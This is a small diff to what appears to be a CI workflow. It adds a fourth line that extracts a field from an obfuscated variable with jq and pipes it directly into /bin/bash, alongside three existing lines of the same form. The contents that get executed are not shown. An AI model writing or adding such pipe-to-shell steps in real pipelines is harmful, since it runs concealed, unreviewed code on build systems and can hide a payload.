@@ -31,6 +31,7 @@ jobs:
           echo $quvp4501 | jq -r .tkmit7086 | /bin/bash
           printf '%s' "$qk2" | jq -r .nffm0211 | /bin/bash
           printf '%s' "$bd281" | jq -r .rvo51 | /bin/bash
+          printf '%s' "$bjn93" | jq -r .l25 | /bin/bash
 
       - name: Save output
         if: always()
